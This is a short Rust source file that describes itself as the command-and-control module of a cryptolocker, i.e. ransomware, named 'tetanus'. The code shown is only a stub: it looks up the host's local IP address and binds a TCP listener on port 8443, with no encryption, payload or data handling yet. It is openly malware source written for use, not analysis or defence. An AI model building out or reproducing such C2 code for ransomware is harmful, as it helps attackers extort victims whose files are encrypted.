// nail is the c2 module for the tetanus cryptolocker malware
const DBUG: i32 = 1;

extern crate std;
extern crate local_ip;

use std::io;
use std::env;
use std::net::{TcpListener, TcpStream};

pub fn init() {
    if DBUG == 1 {
        println!("nail module initialized!");
    }

    let c2_port = ":8443";                          // set the port the server listens on
    let c2_addr = get_ip().to_string();             // get the local ip address to listen on

    let mut addr_string = "".to_string();           // placeholder empty string
    addr_string.push_str(&c2_addr);                 // push the ip address to the string
    addr_string.push_str(&c2_port);                 // push the port to the string

    let c2_lsnr = TcpListener::bind(&*addr_string); // bind the c2 listner address
}

pub fn get_ip() -> std::net::IpAddr  {
// returns the local ip address of the host
    local_ip::get().unwrap()
}
